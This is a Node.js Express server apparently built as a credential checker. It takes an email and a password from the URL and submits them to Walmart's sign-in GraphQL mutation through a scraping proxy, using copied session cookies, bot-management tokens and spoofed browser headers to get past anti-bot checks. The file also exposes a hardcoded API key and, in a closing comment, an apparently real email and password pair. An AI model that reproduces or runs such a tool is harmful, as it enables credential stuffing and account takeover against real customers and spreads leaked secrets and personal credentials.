const fetch = require('node-fetch');
const express = require('express');
const app = express();
const port = 3202;
// get your subscription key at https://rapidapi.com/restyler/api/scrapeninja from "Code generator",
// copy&paste it to 'x-rapidapi-key' header below 
app.get('/r', (req, res) => {
  res.end('roboy');
})
app.get('/:email/:pass', (req, res) => {
  const email = req.params.email;
  const password = req.params.pass;



  let reqq = fetch('https://scrapeninja.p.rapidapi.com/scrape', {
    method: 'POST',
    headers:
    {
      "Content-Type": "application/json",
      "x-rapidapi-host": "scrapeninja.p.rapidapi.com",
      "x-rapidapi-key": "e71062f5d6msh403ed1f07174409p13e33cjsnb75b2e306069"
    },
    body: JSON.stringify({
      "url": "https://www.walmart.com/orchestra/home/graphql",
      "method": "POST",
      "headers": [
        "authority: www.walmart.com",
        "accept: application/json",
        "accept-language: en-US,en;q=0.9,ar;q=0.8",
        "content-type: application/json",
        "cookie: TBV=7; ACID=d48c2f5e-05f8-4de5-9a20-4bf64c1c6a04; hasACID=true; sod=torbit1684380269; abqme=true; vtc=VQgeTQ0p8m4HGNKNy2JPGo; _pxhd=d7c687fa3766a54e4b7278ba04ab2dd869d067cb7783e9d9664a748bcf75d73f:7fe1573e-f52b-11ed-b23f-41435266476f; AID=wmlspartner%3D0%3Areflectorid%3D0000000000000000000000%3Alastupd%3D1684380302644; ak_bmsc=569F931656888734BF860B371B771A9A~000000000000000000000000000000~YAAQd8QTAridlweIAQAAcbfFNRN9aXBlAxVVPiGq/M7ptPoODX7YltaDKMMFLlT3yKHW7xzERQDcQrmRVV/pnP2NqyZHFCcy/T47+AwGio2rNiD9OU1qpwdbgeNvPY+ZrsZ7x0mnlFqnDxPftZCHKW66fBd4Xtgx+b9PyBnA5KRW4cytDMl6oJNUsiP63BurFCfFhDmg6+uPST8iZpkXQGfVqYkZGiJkmCc/OTgCrq1nqp1Y8FPqRMnggAbCFwh0EZZdiquJrS8r+98FxygRmvMRQleiqOUum0bzF+DgJccAto7C35fqxvHrKrmv1OdbKrmw/HauU+A/m1qOINciSq1xs6WflDCMxTMi6ZCAqqNV23828FDoz7bie8DHvzYcE5LekkRuBMu0qg==; auth=MTAyOTYyMDE4ZQRbAaFBU%2FshuBVXjXRH0JV%2BwVyPe0Mq22l%2Bc8DLHDly4X6xb4yA5tvYd5V65VCMiDU0e0L%2BeSfqD8Lrp5J727za03XNxHo6qXPpcIAUH4nGQ0dTIhKhMrkmwUuZ0b1d767wuZloTfhm7Wk2Kcjygv699%2F6tFVwuL3qJB39WKV8CZRy53DcWv52Mbxj5tm4K%2B%2Bnh49kf9%2BEyrQHd%2BZxuTiznfMwy%2BU6%2BmB3ET5ENys4UMk70P8glgOEpLOprhDfMDCcb9mgycy9jtT1uIyOBHUwsN5f3XugCv2J6eSrRnBw%2Ft9Hkv5aRS2AVVwiBW1CHML4wSvmRlEds3DKEayz2vAQxkSlB1%2B7lQ2TMUX9%2BQEl%2FsUZo6cDBMD0INCUADVrbeNQAt6cMD1ZnkphGgmMI8EjyrOXbKKhH072NS%2FW0j%2FU%3D; locDataV3=eyJpc0RlZmF1bHRlZCI6dHJ1ZSwiaXNFeHBsaWNpdCI6ZmFsc2UsImludGVudCI6IlNISVBQSU5HIiwicGlja3VwIjpbeyJidUlkIjoiMCIsIm5vZGVJZCI6IjMwODEiLCJkaXNwbGF5TmFtZSI6IlNhY3JhbWVudG8gU3VwZXJjZW50ZXIiLCJub2RlVHlwZSI6IlNUT1JFIiwiYWRkcmVzcyI6eyJwb3N0YWxDb2RlIjoiOTU4MjkiLCJhZGRyZXNzTGluZTEiOiI4OTE1IEdlcmJlciBSb2FkIiwiY2l0eSI6IlNhY3JhbWVudG8iLCJzdGF0ZSI6IkNBIiwiY291bnRyeSI6IlVTIiwicG9zdGFsQ29kZTkiOiI5NTgyOS0wMDAwIn0sImdlb1BvaW50Ijp7ImxhdGl0dWRlIjozOC40ODI2NzcsImxvbmdpdHVkZSI6LTEyMS4zNjkwMjZ9LCJpc0dsYXNzRW5hYmxlZCI6dHJ1ZSwic2NoZWR1bGVkRW5hYmxlZCI6dHJ1ZSwidW5TY2hlZHVsZWRFbmFibGVkIjp0cnVlLCJodWJOb2RlSWQiOiIzMDgxIiwic3RvcmVIcnMiOiIwNjowMC0yMzowMCIsInN1cHBvcnRlZEFjY2Vzc1R5cGVzIjpbIlBJQ0tVUF9JTlNUT1JFIiwiUElDS1VQX0NVUkJTSURFIl19XSwic2hpcHBpbmdBZGRyZXNzIjp7ImxhdGl0dWRlIjozOC40NzQ2LCJsb25naXR1ZGUiOi0xMjEuMzQzOCwicG9zdGFsQ29kZSI6Ijk1ODI5IiwiY2l0eSI6IlNhY3JhbWVudG8iLCJzdGF0ZSI6IkNBIiwiY291bnRyeUNvZGUiOiJVU0EiLCJnaWZ0QWRkcmVzcyI6ZmFsc2V9LCJhc3NvcnRtZW50Ijp7Im5vZGVJZCI6IjMwODEiLCJkaXNwbGF5TmFtZSI6IlNhY3JhbWVudG8gU3VwZXJjZW50ZXIiLCJzdXBwb3J0ZWRBY2Nlc3NUeXBlcyI6WyJQSUNLVVBfSU5TVE9SRSIsIlBJQ0tVUF9DVVJCU0lERSJdLCJpbnRlbnQiOiJQSUNLVVAifSwiaW5zdG9yZSI6ZmFsc2UsImRlbGl2ZXJ5Ijp7ImJ1SWQiOiIwIiwibm9kZUlkIjoiMzA4MSIsImRpc3BsYXlOYW1lIjoiU2FjcmFtZW50byBTdXBlcmNlbnRlciIsIm5vZGVUeXBlIjoiU1RPUkUiLCJhZGRyZXNzIjp7InBvc3RhbENvZGUiOiI5NTgyOSIsImFkZHJlc3NMaW5lMSI6Ijg5MTUgR2VyYmVyIFJvYWQiLCJjaXR5IjoiU2FjcmFtZW50byIsInN0YXRlIjoiQ0EiLCJjb3VudHJ5IjoiVVMiLCJwb3N0YWxDb2RlOSI6Ijk1ODI5LTAwMDAifSwiZ2VvUG9pbnQiOnsibGF0aXR1ZGUiOjM4LjQ4MjY3NywibG9uZ2l0dWRlIjotMTIxLjM2OTAyNn0sImlzR2xhc3NFbmFibGVkIjp0cnVlLCJzY2hlZHVsZWRFbmFibGVkIjp0cnVlLCJ1blNjaGVkdWxlZEVuYWJsZWQiOnRydWUsImFjY2Vzc1BvaW50cyI6W3siYWNjZXNzVHlwZSI6IkRFTElWRVJZX0FERFJFU1MifV0sImh1Yk5vZGVJZCI6IjMwODEiLCJpc0V4cHJlc3NEZWxpdmVyeU9ubHkiOmZhbHNlLCJzdXBwb3J0ZWRBY2Nlc3NUeXBlcyI6WyJERUxJVkVSWV9BRERSRVNTIl19LCJyZWZyZXNoQXQiOjE2ODQ1MzI5MzczMDMsInZhbGlkYXRlS2V5IjoicHJvZDp2MjpkNDhjMmY1ZS0wNWY4LTRkZTUtOWEyMC00YmY2NGMxYzZhMDQifQ%3D%3D; assortmentStoreId=3081; hasLocData=1; locGuestData=eyJpbnRlbnQiOiJTSElQUElORyIsImlzRXhwbGljaXQiOmZhbHNlLCJzdG9yZUludGVudCI6IlBJQ0tVUCIsIm1lcmdlRmxhZyI6ZmFsc2UsImlzRGVmYXVsdGVkIjp0cnVlLCJwaWNrdXAiOnsibm9kZUlkIjoiMzA4MSIsInRpbWVzdGFtcCI6MTY4NDM4MDI2OTY5Mn0sInNoaXBwaW5nQWRkcmVzcyI6eyJ0aW1lc3RhbXAiOjE2ODQzODAyNjk2OTIsInR5cGUiOiJwYXJ0aWFsLWxvY2F0aW9uIiwiZ2lmdEFkZHJlc3MiOmZhbHNlLCJwb3N0YWxDb2RlIjoiOTU4MjkiLCJjaXR5IjoiU2FjcmFtZW50byIsInN0YXRlIjoiQ0EiLCJkZWxpdmVyeVN0b3JlTGlzdCI6W3sibm9kZUlkIjoiMzA4MSIsInR5cGUiOiJERUxJVkVSWSIsInN0b3JlU2VsZWN0aW9uVHlwZSI6IkRFRkFVTFRFRCIsInN0b3JlU2VsZWN0aW9uU291cmNlIjpudWxsLCJ0aW1lc3RhbXAiOjE2ODQzODAyNjk2OTF9XX0sInBvc3RhbENvZGUiOnsidGltZXN0YW1wIjoxNjg0MzgwMjY5NjkyLCJiYXNlIjoiOTU4MjkifSwidmFsaWRhdGVLZXkiOiJwcm9kOnYyOmQ0OGMyZjVlLTA1ZjgtNGRlNS05YTIwLTRiZjY0YzFjNmEwNCJ9; bstc=U1lId4g1EFOLqvbeP80lVY; mobileweb=0; xpth=x-o-mart%2BB2C~x-o-mverified%2Bfalse; xpa=10hNA|1D1l5|2s5aC|3caIW|5T7w_|60CN2|7C2Eg|ERspM|HhvdQ|MhDyj|OyWBd|X5Bhs|cYAM0|f8iOA|ibl0L|inPVt|jJAPh|jyp9o|mnGKm|pyVOq|sH6LW|uVLHl|yamTG; exp-ck=10hNA13caIW15T7w_3OyWBd1X5Bhs1f8iOA2jJAPh2mnGKm1sH6LW3; akavpau_p2=1684529938~id=7e30d33d20774588a4187baac0b8e617; _astc=ec3dd4d50a9c6faafc04ebf9fa576dfa; adblocked=true; xptc=assortmentStoreId%2B3081; xpm=1%2B1684529339%2BVQgeTQ0p8m4HGNKNy2JPGo~%2B0; userAppVersion=main-1.72.0-1dab6e-0517T0405; bm_mi=4A08B9B24FCBFF50EDF2167BA02F058B~YAAQd8QTAqehlweIAQAAm0LGNRP8gAxyTk2S1q0eSkd2feD8n34Fuy9DdqUHzEsXT15IaAFYTokz9tYUlepvAXKaVcP9pOhKYHx183GGDaMEm10Y1T9qfd0YJ7Dg7dSYyUp9tVG0WD0+KNRFV7mNf1fls5sUUoJMH8HRq9Qt/Or7FOxfzGAm06i5BIKVp52vLO9g4Vi4prp4bR6SD/J41EewJkPuTBdqME6y0WHzfvAuYiWCv+Ch7lf6tL0iO/wF7i1Aw38tBz7XXHkA/KKqm89nlgZZQPhNZRjDqHbMcsNf7eqD5kVQm0xpr9gr7EN6Oi4Y/bSFNFx02bs=~1; xptwj=rq:2014be02d26b752ea004:oEPPSFJNDPEsmP4UQvri6ZLFEG8tVBtFWwloDKF1eHM54Lj7IJkD3K+Oa5+voCMxIa+NRm9/nJj56votElTN3B39E64ZxRCRRxZZJVr46p48uiSStP4LBYQ=; TS012768cf=0178545c909a73a2f76c4613c726bcc0c27da79d8f16d536b4cf5635f94a324ff3d896cfc134cba7e9bba0869b0e92c638bf5ee8f2; TS01a90220=0178545c909a73a2f76c4613c726bcc0c27da79d8f16d536b4cf5635f94a324ff3d896cfc134cba7e9bba0869b0e92c638bf5ee8f2; com.wm.reflector=\"reflectorid:0000000000000000000000@lastupd:1684529371000@firstcreate:1684380279836\"; xptwg=1556199199:40622973F41070:A427D0:F2C2CFDE:9508949F:23912A13:; TS2a5e0c5c027=0881c5dd0aab20005eadf4829280edad8231976bd614855c7f12798c80e80b6d7f368f7994538a2008c93bfd54113000b6ac0626befc735a8ce90d46d517b8042dac85e9c6729a15f01179ce515cd05efe9f170f54a3f1e78ef93c6488d15bea; bm_sv=C88E114DB5AB080C2A56878FDA177B6A~YAAQd8QTAiKilweIAQAAUVjGNRP7ifQC3/dXzG01WgEmNALbcbllx+HK/kQjpaIcJDJWSs+2X3LNZyulNOQFsHsCtCKaAyo7jTRr8jPaWHwVYfAnRAYPMA0MAiQDsy+G43wC635zTgK8HnUefthdWUnwhJmxEzvVik4XCmUGrSEkcmG0iiwEBgD+Aq7w1S3uh0wG2fthJMlZZL5gh1CwEaAkMSN9hcKKkJb5NVOzkBjlZvFYiRnytOrNjeRrX1GX6Q==~1",
        "device_profile_ref_id: juVmMKAg0k987EtEhO_M6N7QXaCLGJj7bu8b",
        "origin: https://www.walmart.com",
        "referer: https://www.walmart.com/account/signin/withotpchoice?vid=oaoh&tid=0&returnUrl=%2F",
        "sec-ch-ua: \"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
        "sec-ch-ua-mobile: ?0",
        "sec-ch-ua-platform: \"Windows\"",
        "sec-fetch-dest: empty",
        "sec-fetch-mode: cors",
        "sec-fetch-site: same-origin",
        "sec-gpc: 1",
        "traceparent: 00-1e518fc18a59d1f860d0dc55505a93f2-984437450dcc9a17-00",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "wm_mp: true",
        "wm_page_url: https://www.walmart.com/account/signin/withotpchoice?vid=oaoh&tid=0&returnUrl=%2F",
        "wm_qos.correlation_id: 9TuPQproSp3ZMvF2odAyW-HsDt6V6hx1lw3e",
        "x-apollo-operation-name: SignIn",
        "x-enable-server-timing: 1",
        "x-latency-trace: 1",
        "x-o-bu: WALMART-US",
        "x-o-ccm: server",
        "x-o-correlation-id: 9TuPQproSp3ZMvF2odAyW-HsDt6V6hx1lw3e",
        "x-o-gql-query: mutation SignIn",
        "x-o-mart: B2C",
        "x-o-platform: rweb",
        "x-o-platform-version: main-1.72.0-1dab6e-0517T0405",
        "x-o-segment: oaoh"
      ],
      data: `{\"query\":\"mutation SignIn($input:SignInInput! $includeLoginOptions:Boolean = false){signIn(input:$input){auth{loginId authCode}errors{...SignInErrorFragment}loginOptions @include(if:$includeLoginOptions){...LoginOptionsFragment}multiFactorInfo{nextFactor hasRemainingFactors phoneLastFour}}}fragment SignInErrorFragment on IdentitySignInError{code message}fragment LoginOptionsFragment on LoginOptions{loginId canUsePassword canUsePhoneOTP canUseEmailOTP loginPhoneLastFour signInPreference loginPreference lastLoginPreference hasRemainingFactors}\",\"variables\":{\"input\":{\"email\":"${email}",\"password\":"${password}",\"rememberMe\":false}}}`
    })

  });
  reqq.then((res) => res.json()).then(json => res.send(json.body))
})
app.listen(port);

// {\"email\":\"pupdates52@gmail.com\",\"password\":\"Jonobono11#@\",\"rememberMe\":false}}}"